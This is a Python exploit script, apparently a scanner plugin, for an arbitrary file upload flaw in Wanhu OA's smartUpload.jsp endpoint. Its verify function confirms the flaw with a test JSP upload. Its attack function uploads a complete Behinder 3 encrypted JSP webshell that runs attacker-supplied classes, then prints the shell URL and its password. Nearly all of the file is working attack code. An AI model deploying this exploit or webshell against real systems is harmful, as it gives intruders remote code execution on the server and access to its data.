import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '万户OA smartUpload.jsp 任意文件上传漏洞',
        'vulnerable': False,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/310fYuAqQfoKVGNWCLLg2g',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0'
    payload2 = '/defaultroot/upload/information/{0}'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\nContent-Disposition: form-data; name="photo"; filename="0xold6.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n{0}\r\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\nContent-Disposition: form-data; name="continueUpload"\r\n\r\n1\r\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\nContent-Disposition: form-data; name="submit"\r\n\r\n上传继续\r\n------WebKitFormBoundarynNQ8hoU56tfSwBVU--'.format(shell).encode('utf-8').decode('latin-1')
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('\+"\d+\.jsp"\+', rep.text):
            filename = re.findall('\+"(\d+\.jsp)"\+', rep.text)[0]
            verify_url = urllib.parse.urljoin(url, payload2.format(filename))
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

def attack(url):
    shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
    payload = '/defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0'
    payload2 = '/defaultroot/upload/information/{0}'
    timeout = 10
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\nContent-Disposition: form-data; name="photo"; filename="0xold6.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n{0}\r\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\nContent-Disposition: form-data; name="continueUpload"\r\n\r\n1\r\n------WebKitFormBoundarynNQ8hoU56tfSwBVU\r\nContent-Disposition: form-data; name="submit"\r\n\r\n上传继续\r\n------WebKitFormBoundarynNQ8hoU56tfSwBVU--'.format(shell).encode('utf-8').decode('latin-1')
    print("[+] explot loading ......")
    try:
        time.sleep(2)
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        print("[+] 开始上传冰蝎3 webshell")
        if rep.status_code == 200 and re.search('\+"\d+\.jsp"\+', rep.text):
            print("[+] 上传完成，正在检测是否存在?")
            filename = re.findall('\+"(\d+\.jsp)"\+', rep.text)[0]
            print("[*] get path: ", filename)
            verify_url = urllib.parse.urljoin(url, payload2.format(filename))
            verify_rep = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if verify_rep.status_code == 200:
                print("[*] 上传成功! webshell(冰蝎3): ", verify_url)
                print("[*] 密码: rebeyond")
                return True
        return False
    except:
        return False